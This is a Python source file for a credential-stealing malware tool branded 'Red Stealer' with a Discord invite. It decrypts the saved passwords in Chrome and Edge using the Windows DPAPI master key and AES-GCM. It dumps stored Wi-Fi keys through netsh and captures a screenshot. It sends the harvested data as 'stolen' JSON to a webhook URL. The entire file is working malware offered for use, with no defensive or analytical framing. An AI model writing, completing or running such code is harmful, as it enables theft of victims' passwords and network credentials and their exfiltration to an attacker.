import os
import json
import sqlite3
import shutil
import base64
from Crypto.Cipher import AES
import win32crypt
from PIL import ImageGrab
import requests
import logging
import io
import subprocess

logging.getLogger('discord').setLevel(logging.CRITICAL)

WEBHOOK_URL = 'webhook'


def get_encryption_key(browser="chrome"):
    try:
        if browser == "chrome":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        elif browser == "edge":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        else:
            raise ValueError("Unsupported browser specified")

        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        decrypted_key = decrypt_master_key(encrypted_key)

        return decrypted_key if decrypted_key else None
    except Exception as e:
        print(f"Error retrieving encryption key: {e}")
        return None


def decrypt_master_key(encrypted_key):
    try:
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"Error decrypting master key: {e}")
        return None


def decrypt_password_chrome(ciphertext, key):
    try:
        
        iv = ciphertext[3:15]  
        encrypted_data = ciphertext[15:-16]  
        auth_tag = ciphertext[-16:]  

        
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(encrypted_data, auth_tag)

        return decrypted.decode("utf-8")
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return None


def get_passwords_from_browser(browser="chrome"):
    key = get_encryption_key(browser)
    if not key:
        return {}

    paths = {
        "chrome": ["Google", "Chrome"],
        "edge": ["Microsoft", "Edge"],
    }

    if browser in paths:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", paths[browser][0], paths[browser][1], "User Data", "Default", "Login Data")
    else:
        return {}

    if not os.path.exists(db_path):
        return {}

    file_name = "LoginData.db"
    shutil.copyfile(db_path, file_name)

    db = sqlite3.connect(file_name)
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    result = {}
    for row in cursor.fetchall():
        action_url = row[0]
        username = row[1]
        password = decrypt_password_chrome(row[2], key)

        if username and password:
            result[action_url] = [username, password]

    cursor.close()
    db.close()
    os.remove(file_name)
    return result


def grabscreen():
    screenshot = ImageGrab.grab()
    return screenshot


def grabscreenbytes(screenshot):
    ssba = io.BytesIO()
    screenshot.save(ssba, format='PNG')
    return ssba.getvalue()


def get_wifi_passwords():
    wifi_data = {}
    try:
        
        profiles = subprocess.check_output("netsh wlan show profiles").decode("utf-8").split("\n")
        for profile in profiles:
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1][1:-1]
                try:
                    
                    wifi_info = subprocess.check_output(f"netsh wlan show profile {profile_name} key=clear").decode("utf-8")
                    if "Key Content" in wifi_info:
                        password = wifi_info.split("Key Content")[1].split(":")[1][1:-1]
                        wifi_data[profile_name] = password
                    else:
                        wifi_data[profile_name] = "No password set"
                except subprocess.CalledProcessError:
                    wifi_data[profile_name] = "Error retrieving password"
    except subprocess.CalledProcessError as e:
        print(f"Error retrieving Wi-Fi profiles: {e}")
    return wifi_data


def send_to_webhook(data):
    try:
        files = {'file': ('INFO.txt', data)}
        response = requests.post(WEBHOOK_URL, files=files)
        if response.status_code == 204:
            print("Data sent successfully.")
        else:
            print("Failed to send data.")
    except Exception as e:
        print(f"Error sending data to webhook: {e}")


def main():
    try:
        
        chrome_data = get_passwords_from_browser("chrome")
        edge_data = get_passwords_from_browser("edge")

        
        wifi_data = get_wifi_passwords()

        
        screenshot = grabscreen()
        screenshot_bytes = grabscreenbytes(screenshot)

        
        stolen_data = {
            "Chrome Passwords stolen by Red Stealer discord.gg/redware-v2-1322149441607827467": chrome_data,
            "Edge Passwords stolen by Red Stealer discord.gg/redware-v2-1322149441607827467": edge_data,
            "Wi-Fi Passwords stolen by Red Stealer discord.gg/redware-v2-1322149441607827467": wifi_data
        }

        
        data = json.dumps(stolen_data, indent=2)

        
        send_to_webhook(data)

        print("Stolen data sent to webhook.")

    except Exception as e:
        print(f"Error in main function: {e}")

if __name__ == "__main__":
    main()
